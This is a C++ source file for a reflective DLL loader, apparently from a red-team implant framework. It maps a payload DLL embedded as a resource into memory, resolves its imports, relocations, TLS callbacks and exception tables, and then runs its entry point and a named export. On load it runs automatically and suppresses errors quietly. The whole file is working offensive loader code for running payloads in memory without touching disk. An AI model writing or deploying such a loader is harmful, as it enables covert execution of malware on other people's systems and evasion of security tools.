#include "StdAfx.h"
#include "AccessPayload.h"
#include "UnexportedWinApi.h"
#include "QuietAbort.h"

#ifdef _WIN64
#define HOST_MACHINE IMAGE_FILE_MACHINE_AMD64
#else
#define HOST_MACHINE IMAGE_FILE_MACHINE_I386
#endif

#pragma warning( push )
#pragma warning( disable : 4214 ) // nonstandard extension
typedef struct
{
	WORD	offset : 12;
	WORD	type : 4;
} IMAGE_RELOC, * PIMAGE_RELOC;
#pragma warning(pop)

typedef BOOL(WINAPI* DllEntryPoint)(HINSTANCE, DWORD, LPVOID);
typedef void (*ExportFunc)(void);

struct
{
	UINT_PTR m_DllBaseAddress;
	DWORD m_SizeOfTheDll;
} moduleData;

/// Used both by VEH and SetUnhandledExceptionFilter. Based on BlackBone memory injection toolkit.
/// @param exceptionInfo filled _EXCEPTION_POINTERS structure describing occurred exception.
/// @return always returns EXCEPTION_CONTINUE_SEARCH.
LONG CALLBACK PatchCppException(PEXCEPTION_POINTERS exceptionInfo)
{
	// Filter by Visual Studio magic for C++ exception, see https://web.archive.org/web/20170911103343/https://support.microsoft.com/en-us/help/185294/prb-exception-code-0xe06d7363-when-calling-win32-seh-apis
	if (exceptionInfo->ExceptionRecord->ExceptionCode == EH_EXCEPTION_NUMBER &&
		exceptionInfo->ExceptionRecord->NumberParameters == 4 &&
		exceptionInfo->ExceptionRecord->ExceptionInformation[2] >= moduleData.m_DllBaseAddress &&					// Check exception site image boundaries.
		exceptionInfo->ExceptionRecord->ExceptionInformation[2] <= moduleData.m_DllBaseAddress + moduleData.m_SizeOfTheDll &&
		exceptionInfo->ExceptionRecord->ExceptionInformation[0] == EH_PURE_MAGIC_NUMBER1 &&
		exceptionInfo->ExceptionRecord->ExceptionInformation[3] == 0)
	{
		exceptionInfo->ExceptionRecord->ExceptionInformation[0] = (ULONG_PTR)EH_MAGIC_NUMBER1;					//< CRT magic number, used in exception records for native or mixed C++ thrown objects.
		exceptionInfo->ExceptionRecord->ExceptionInformation[3] = (ULONG_PTR)moduleData.m_DllBaseAddress;		//< Fix exception image base.
	}

	// Continue the handler search.
	return EXCEPTION_CONTINUE_SEARCH;
}

/// Load PE file image and call
/// @param dllData - pointer to PE file in memory
/// @param callExport - name of an exported function to call. Function must have a signature of ExportFunc [typedef void (*ExportFunc)(void)]
int LoadPe(void* dllData, std::string_view callExport)
{
	using namespace MWR::Loader;
	// Loader code based on Shellcode Reflective DLL Injection by Nick Landers https://github.com/monoxgas/sRDI
	// which is derived from "Improved Reflective DLL Injection" from Dan Staples https://disman.tl/2015/01/30/an-improved-reflective-dll-injection-technique.html
	// which itself is derived from the original project by Stephen Fewer. https://github.com/stephenfewer/ReflectiveDLLInjection

	auto dosHeader = Rva2Va<PIMAGE_DOS_HEADER>(dllData, 0);
	auto ntHeaders = Rva2Va<PIMAGE_NT_HEADERS>(dllData, dosHeader->e_lfanew);
	auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;

	// Perform sanity checks on the image (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE)
		return 1;

	if (ntHeaders->FileHeader.Machine != HOST_MACHINE)
		return 1;

	if (ntHeaders->OptionalHeader.SectionAlignment & 1)
		return 1;

	// Align the image to the page size (Stolen from https://github.com/fancycode/MemoryModule/blob/master/MemoryModule.c)

	auto sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	DWORD lastSectionEnd = 0;
	DWORD endOfSection;
	for (size_t i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		if (sectionHeader->SizeOfRawData == 0)
			endOfSection = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.SectionAlignment;
		else
			endOfSection = sectionHeader->VirtualAddress + sectionHeader->SizeOfRawData;

		if (endOfSection > lastSectionEnd)
			lastSectionEnd = endOfSection;
	}

	SYSTEM_INFO sysInfo;
	GetNativeSystemInfo(&sysInfo);
	auto alignedImageSize = AlignValueUp(ntHeaders->OptionalHeader.SizeOfImage, sysInfo.dwPageSize);
	if (alignedImageSize != AlignValueUp(lastSectionEnd, sysInfo.dwPageSize))
		return 1;

	UINT_PTR baseAddress = (UINT_PTR)VirtualAlloc(NULL, alignedImageSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!baseAddress)
		return 1;

	/// Copy headers
	memcpy((void*)baseAddress, dllData, ntHeaders->OptionalHeader.SizeOfHeaders);

	// STEP 3: Load in the sections
	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		auto sectionVa = Rva2Va<void*>(baseAddress, sectionHeader->VirtualAddress);
		auto sectionRawData = Rva2Va<void*>(dllData, sectionHeader->PointerToRawData);
		memcpy(sectionVa, sectionRawData, sectionHeader->SizeOfRawData);
	}


	///
	// STEP 4: process all of our images relocations (assuming we missed the preferred address)
	///

	auto baseOffset = (UINT_PTR)baseAddress - ntHeaders->OptionalHeader.ImageBase;
	auto dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	if (baseOffset && dataDir->Size)
	{

		auto relocation = Rva2Va<PIMAGE_BASE_RELOCATION>(baseAddress, dataDir->VirtualAddress);

		while (relocation->VirtualAddress)
		{
			auto relocList = (PIMAGE_RELOC)(relocation + 1);

			while ((PBYTE)relocList != (PBYTE)relocation + relocation->SizeOfBlock)
			{

				if (relocList->type == IMAGE_REL_BASED_DIR64)
					*(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += baseOffset;
				else if (relocList->type == IMAGE_REL_BASED_HIGHLOW)
					*(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += (DWORD)baseOffset;
				else if (relocList->type == IMAGE_REL_BASED_HIGH)
					*(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += HIWORD(baseOffset);
				else if (relocList->type == IMAGE_REL_BASED_LOW)
					*(PULONG_PTR)((PBYTE)baseAddress + relocation->VirtualAddress + relocList->offset) += LOWORD(baseOffset);

				relocList++;
			}
			relocation = (PIMAGE_BASE_RELOCATION)relocList;
		}
	}

	///
	// STEP 5: process our import table
	///

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	if (dataDir->Size)
	{
		auto importDesc = Rva2Va<PIMAGE_IMPORT_DESCRIPTOR>(baseAddress, dataDir->VirtualAddress);
		for (; importDesc->Name; importDesc++)
		{
			auto libraryAddress = (PBYTE)LoadLibraryA((LPCSTR)(baseAddress + importDesc->Name));
			auto firstThunk = Rva2Va<PIMAGE_THUNK_DATA>(baseAddress, importDesc->FirstThunk);
			auto origFirstThunk = Rva2Va<PIMAGE_THUNK_DATA>(baseAddress, importDesc->OriginalFirstThunk);

			// iterate through all imported functions, importing by ordinal if no name present
			for (; origFirstThunk->u1.Function; firstThunk++, origFirstThunk++)
			{
				if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal))
				{
					firstThunk->u1.Function = (ULONG_PTR)GetProcAddress((HMODULE)libraryAddress, (LPCSTR)IMAGE_ORDINAL(origFirstThunk->u1.Ordinal));
				}
				else
				{
					auto importByName = Rva2Va<PIMAGE_IMPORT_BY_NAME>(baseAddress, origFirstThunk->u1.AddressOfData);
					firstThunk->u1.Function = (ULONG_PTR)GetProcAddress((HMODULE)libraryAddress, importByName->Name);
				}
			}
		}
	}

	///
	// STEP 6: process our delayed import table
	///

	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT];

	if (dataDir->Size)
	{
		auto delayDesc = Rva2Va<PIMAGE_DELAYLOAD_DESCRIPTOR>(baseAddress, dataDir->VirtualAddress);

		for (; delayDesc->DllNameRVA; delayDesc++)
		{
			auto libraryAddress = (PBYTE)LoadLibraryA((LPCSTR)(baseAddress + delayDesc->DllNameRVA));
			auto firstThunk = Rva2Va<PIMAGE_THUNK_DATA>(baseAddress, delayDesc->ImportAddressTableRVA);
			auto origFirstThunk = Rva2Va<PIMAGE_THUNK_DATA>(baseAddress, delayDesc->ImportNameTableRVA);

			// iterate through all imported functions, importing by ordinal if no name present
			for (; firstThunk->u1.Function; firstThunk++, origFirstThunk++)
			{
				if (IMAGE_SNAP_BY_ORDINAL(origFirstThunk->u1.Ordinal))
				{
					firstThunk->u1.Function = (ULONG_PTR)GetProcAddress((HMODULE)libraryAddress, (LPCSTR)IMAGE_ORDINAL(origFirstThunk->u1.Ordinal));
				}
				else
				{
					auto importByName = Rva2Va<PIMAGE_IMPORT_BY_NAME>(baseAddress, origFirstThunk->u1.AddressOfData);
					firstThunk->u1.Function = (ULONG_PTR)GetProcAddress((HMODULE)libraryAddress, importByName->Name);
				}
			}
		}
	}

	///
	// STEP 7: Finalize our sections. Set memory protections.
	///
	sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);

	for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++, sectionHeader++)
	{
		if (sectionHeader->SizeOfRawData)
		{
			// determine protection flags based on characteristics
			bool executable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
			bool readable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_READ) != 0;
			bool writeable = (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

			DWORD protect = 0;
			if (!executable && !readable && !writeable)
				protect = PAGE_NOACCESS;
			else if (!executable && !readable && writeable)
				protect = PAGE_WRITECOPY;
			else if (!executable && readable && !writeable)
				protect = PAGE_READONLY;
			else if (!executable && readable && writeable)
				protect = PAGE_READWRITE;
			else if (executable && !readable && !writeable)
				protect = PAGE_EXECUTE;
			else if (executable && !readable && writeable)
				protect = PAGE_EXECUTE_WRITECOPY;
			else if (executable && readable && !writeable)
				protect = PAGE_EXECUTE_READ;
			else if (executable && readable && writeable)
				protect = PAGE_EXECUTE_READWRITE;

			if (sectionHeader->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
				protect |= PAGE_NOCACHE;

			// change memory access flags
			VirtualProtect(Rva2Va<LPVOID>(baseAddress, sectionHeader->VirtualAddress), sectionHeader->SizeOfRawData, protect, &protect);
		}
	}

	// We must flush the instruction cache to avoid stale code being used
	FlushInstructionCache((HANDLE)-1, nullptr, 0);

	///
	// STEP 7.1: Set static TLS values
	///
	MWR::Loader::UnexportedWinApi::LdrpHandleTlsData((void*)baseAddress);

	///
	// STEP 8: execute TLS callbacks
	///
	dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (dataDir->Size)
	{
		auto tlsDir = Rva2Va<PIMAGE_TLS_DIRECTORY>(baseAddress, dataDir->VirtualAddress);
		auto callback = (PIMAGE_TLS_CALLBACK*)(tlsDir->AddressOfCallBacks);

		for (; *callback; callback++)
			(*callback)((LPVOID)baseAddress, DLL_PROCESS_ATTACH, NULL);
	}

	//
	// STEP 8.1: Add Exception handling
	//
#if defined _M_X64
	auto pImageEntryException = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];

	if (pImageEntryException->Size > 0)
	{
		auto functionTable = Rva2Va<PRUNTIME_FUNCTION>(baseAddress, pImageEntryException->VirtualAddress);
		DWORD count = pImageEntryException->Size / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
		if (!RtlAddFunctionTable(functionTable, count, (DWORD64)baseAddress))
			return 1;
	}

	// register VEH
	moduleData.m_DllBaseAddress = baseAddress;
	moduleData.m_SizeOfTheDll = ntHeaders->OptionalHeader.SizeOfImage;
	auto veh = AddVectoredExceptionHandler(0, PatchCppException);
	if (!veh)
		return 1;

#elif defined _M_IX86
	MWR::Loader::UnexportedWinApi::RtlInsertInvertedFunctionTable((void*)baseAddress, ntHeaders->OptionalHeader.SizeOfImage);
#endif

	///
	// STEP 9: call our images entry point
	///
	auto dllEntryPoint = Rva2Va<DllEntryPoint>(baseAddress, ntHeaders->OptionalHeader.AddressOfEntryPoint);
	dllEntryPoint((HINSTANCE)baseAddress, DLL_PROCESS_ATTACH, NULL);

	///
	// STEP 10: call our exported function
	///
	if (!callExport.empty())
	{
		do
		{
			dataDir = &ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
			if (!dataDir->Size)
				break;

			auto exportDir = (PIMAGE_EXPORT_DIRECTORY)(baseAddress + dataDir->VirtualAddress);
			if (!exportDir->NumberOfNames || !exportDir->NumberOfFunctions)
				break;

			auto expName = Rva2Va<PDWORD>(baseAddress, exportDir->AddressOfNames);
			auto expOrdinal = Rva2Va<PWORD>(baseAddress, exportDir->AddressOfNameOrdinals);

			for (size_t i = 0; i < exportDir->NumberOfNames; i++, expName++, expOrdinal++)
			{
				auto expNameStr = Rva2Va<LPCSTR>(baseAddress, *expName);

				if (!expNameStr)
					break;

				if (expNameStr == callExport && expOrdinal)
				{
					auto exportFunc = Rva2Va<ExportFunc>(baseAddress, *(PDWORD)(baseAddress + exportDir->AddressOfFunctions + (*expOrdinal * 4)));
					exportFunc();
					break;
				}
			}
		} while (0);
	}

	// STEP 11 Cleanup
#if defined _M_X64
	RemoveVectoredExceptionHandler(veh);
	if (pImageEntryException->Size > 0)
	{
		auto functionTable = Rva2Va<PRUNTIME_FUNCTION>(baseAddress, pImageEntryException->VirtualAddress);
		RtlDeleteFunctionTable(functionTable);
	}
#elif defined _M_IX86
	// TODO cleanup after RtlInsertInvertedFunctionTable -> see ntdll!_RtlRemoveInvertedFunctionTable@4
#endif
	VirtualFree((void*)baseAddress, alignedImageSize, MEM_RELEASE);
	return 0;
}

/// Execute dll embedded as a resource [see ResourceGenerator]
/// @param baseAddress of this Module
void ExecResource(void* baseAddress)
{
	MWR_SET_QUIET_ABORT(
		if (auto resource = FindStartOfResource(baseAddress))
		{
			auto dllData = GetPayload(resource);
			auto exportFunc = GetExportName(resource);
			LoadPe(dllData, exportFunc);
		}
	);
}

#ifdef NDEBUG
/// Entry point for this module. Executes the embedded resource on process attach
BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID)
{
	// Indicate successful load of the library.
	if (reason == DLL_PROCESS_ATTACH)
		ExecResource(instance);

	return TRUE;
}
#else

/// Debug version of entry point, executes the embedded resource
int main()
{
	ExecResource(GetModuleHandle(NULL));
}
#endif
